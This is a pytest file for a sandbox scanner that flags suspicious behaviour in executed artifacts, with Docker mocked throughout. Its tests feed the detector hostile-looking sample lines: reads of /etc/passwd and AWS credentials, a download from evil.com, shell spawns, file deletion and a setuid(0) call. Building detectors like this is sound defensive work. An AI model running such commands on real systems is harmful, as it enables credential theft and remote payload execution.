"""
Sandbox tests.
subprocess.run and filesystem are mocked — no Docker needed.
"""

import subprocess
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from scanner.models.sandbox import SandboxEventType
from scanner.sandbox.observer import observe
from scanner.sandbox.runner import run


# ==============================================================================
# OBSERVER TESTS
# ==============================================================================

def test_observe_network_connect():
    output = "socket.connect(('192.168.1.1', 4444))"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.NETWORK_CONNECT for e in events)
    assert any(e.suspicious for e in events)


def test_observe_shell_execution():
    output = "subprocess.run(['/bin/sh', '-c', 'id'], shell=True)"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.SHELL_EXECUTION for e in events)
    assert any(e.suspicious for e in events)


def test_observe_secret_access():
    output = "open('/etc/passwd', 'r')"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.SECRET_ACCESS for e in events)


def test_observe_aws_credentials_access():
    output = "reading ~/.aws/credentials"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.SECRET_ACCESS for e in events)
    assert any(e.suspicious for e in events)


def test_observe_unexpected_download():
    output = "urllib.request.urlretrieve('http://evil.com/payload', '/tmp/p')"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.UNEXPECTED_DOWNLOAD for e in events)


def test_observe_file_delete():
    output = "os.remove('/workspace/important.py')"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.FILE_DELETE for e in events)
    assert any(e.suspicious for e in events)


def test_observe_privilege_escalation():
    output = "os.setuid(0)  # trying to become root"
    events = observe("art-001", output)
    assert any(e.event_type == SandboxEventType.PRIVILEGE_ESCALATION for e in events)


def test_observe_clean_output_no_suspicious():
    output = "Hello world\nCalculation complete\nDone."
    events = observe("art-001", output)
    assert all(not e.suspicious for e in events)


def test_observe_empty_output():
    assert observe("art-001", "") == []


def test_observe_blank_lines_ignored():
    output = "\n\n   \n\n"
    assert observe("art-001", output) == []


def test_observe_detail_capped_at_300_chars():
    long_line = "subprocess.run(" + "x" * 400 + ")"
    events = observe("art-001", long_line)
    assert len(events) > 0
    for e in events:
        assert len(e.detail) <= 300


def test_observe_artifact_id_set_on_all_events():
    output = "subprocess.run(['ls'])\nos.remove('/tmp/x')"
    events = observe("art-xyz", output)
    for e in events:
        assert e.artifact_id == "art-xyz"


# ==============================================================================
# RUNNER TESTS
# ==============================================================================

def _mock_docker(stdout: str = "", stderr: str = "", returncode: int = 0):
    m = MagicMock()
    m.stdout = stdout
    m.stderr = stderr
    m.returncode = returncode
    return m


def test_runner_success_clean_output():
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "main.py").write_text("print('hello')")
        with patch("subprocess.run", return_value=_mock_docker(stdout="hello\n")):
            report = run("art-001", tmpdir)

    assert report.executed is True
    assert report.exit_code == 0
    assert report.execution_error is None
    assert report.duration_seconds is not None


def test_runner_detects_shell_in_output():
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "setup.py").write_text("import subprocess; subprocess.run('/bin/sh')")
        output = "subprocess.run('/bin/sh', shell=True)"
        with patch("subprocess.run", return_value=_mock_docker(stdout=output)):
            report = run("art-001", tmpdir)

    assert report.executed is True
    assert report.suspicious_event_count > 0
    assert any(e.event_type == SandboxEventType.SHELL_EXECUTION for e in report.events)


def test_runner_detects_network_in_output():
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "main.py").write_text("")
        output = "requests.get('http://evil.com')\nconnect((192.168.1.1, 80))"
        with patch("subprocess.run", return_value=_mock_docker(stdout=output)):
            report = run("art-001", tmpdir)

    assert any(e.event_type == SandboxEventType.NETWORK_CONNECT for e in report.events)


def test_runner_timeout_returns_report():
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "main.py").write_text("")
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("docker", 30)):
            report = run("art-001", tmpdir, timeout=30)

    assert report.executed is True
    assert report.execution_error is not None
    assert "timed out" in report.execution_error


def test_runner_docker_not_available():
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "main.py").write_text("")
        with patch("subprocess.run", side_effect=FileNotFoundError):
            report = run("art-001", tmpdir)

    assert report.executed is False
    assert "Docker not available" in report.execution_error


def test_runner_no_entrypoint_returns_report():
    with tempfile.TemporaryDirectory() as tmpdir:
        # No .py files
        report = run("art-001", tmpdir)

    assert report.executed is False
    assert "entrypoint" in report.execution_error.lower()


def test_runner_uses_setup_py_over_main_py():
    """setup.py should be preferred as entrypoint over main.py."""
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "setup.py").write_text("")
        Path(tmpdir, "main.py").write_text("")
        with patch("subprocess.run", return_value=_mock_docker()) as mock_run:
            run("art-001", tmpdir)
        cmd = mock_run.call_args[0][0]
        assert any("setup.py" in part for part in cmd)


def test_runner_suspicious_event_count_matches():
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "main.py").write_text("")
        output = "subprocess.run('/bin/sh')\nos.remove('/etc/passwd')"
        with patch("subprocess.run", return_value=_mock_docker(stdout=output)):
            report = run("art-001", tmpdir)

    assert report.suspicious_event_count == sum(1 for e in report.events if e.suspicious)


def test_runner_never_raises():
    """Runner must return a SandboxReport even on unexpected errors."""
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(tmpdir, "main.py").write_text("")
        with patch("subprocess.run", side_effect=RuntimeError("unexpected")):
            report = run("art-001", tmpdir)
    assert report is not None
    assert report.executed is False
